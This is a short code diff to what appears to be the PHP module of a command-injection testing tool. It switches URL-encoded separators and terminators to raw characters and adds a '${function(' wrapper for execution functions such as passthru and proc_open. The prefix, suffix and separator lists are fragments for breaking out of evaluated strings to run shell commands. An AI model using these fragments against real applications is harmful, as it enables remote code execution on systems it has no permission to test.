@@ -56,8 +56,8 @@ EXECUTION_FUNCTIONS_LVL3 = EXECUTION_FUNCTIONS_LVL2 + ["passthru", "proc_open", 
 
 # Breaking out of the evaluated string, and closing it again behind the payload.
 SEPARATORS_LVL1 = [""]
-SEPARATORS_LVL2 = SEPARATORS_LVL1 + ["%0a"]
-SEPARATORS_LVL3 = SEPARATORS_LVL2 + ["%0d%0a"]
+SEPARATORS_LVL2 = SEPARATORS_LVL1 + ["\n"]
+SEPARATORS_LVL3 = SEPARATORS_LVL2 + ["\r\n"]
 
 # Concatenation, concatenation out of a single-quoted string, and variable-variable interpolation.
 PREFIXES_LVL1 = [".", "'.", "{${"]
@@ -69,7 +69,7 @@ PREFIXES_LVL3 = PREFIXES_LVL2 + ["')", "\")", ");}", "\");}", ")", ";", "'", "\"
 SUFFIXES_LVL1 = [ "",  ".'", "}}"]
 # Closing the interpolation, and commenting out whatever the application appends behind it.
 SUFFIXES_LVL2 = SUFFIXES_LVL1 + ["'#", "}", "}\""]
-SUFFIXES_LVL3 = SUFFIXES_LVL2 + [".\"", "\\\\", "//", ")}", "#", "%3B//", "%3B#", "/*"]
+SUFFIXES_LVL3 = SUFFIXES_LVL2 + [".\"", "\\\\", "//", ")}", "#", ";//", ";#", "/*"]
 
 """
 Wrap the shell commands a payload runs in this language's print statement.
@@ -90,6 +90,10 @@ long the answer is, tell me its Nth byte, wait this long if the answer is yes. O
 differs - so the techniques ask through the names below, and a language is added by writing them
 again rather than by touching a payload.
 """
+
+# How one of the functions above is reached, as a prefix a payload is wrapped in.
+def execution_prefix(function):
+  return "${" + function + "("
 
 # Run a command and yield its output.
 def run(cmd):
@@ -124,6 +128,6 @@ def sequence(first, second):
   return first + "." + second
 
 # What ends a statement, where the boundary being tested can carry one.
-TERMINATOR = "%3B"
+TERMINATOR = ";"
 
 # eof
